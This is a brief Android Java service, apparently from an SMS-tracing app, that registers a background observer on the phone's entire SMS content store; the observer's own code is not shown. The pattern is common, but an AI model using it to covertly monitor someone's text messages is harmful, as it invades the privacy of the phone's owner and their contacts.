package phone.trace.sms;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;

public class SmsSendService extends Service{

    @Override  
    public void onCreate() {
         SmsObserver smsObserverBg_ = new SmsObserver(this);
         // REGISTER ContetObserver 
         this.getContentResolver().
             registerContentObserver(Uri.parse("content://sms/"), true, smsObserverBg_);  
     } 

    @Override
    public IBinder onBind(Intent arg0) {
         // TODO Auto-generated method stub

         return null;
    }
}
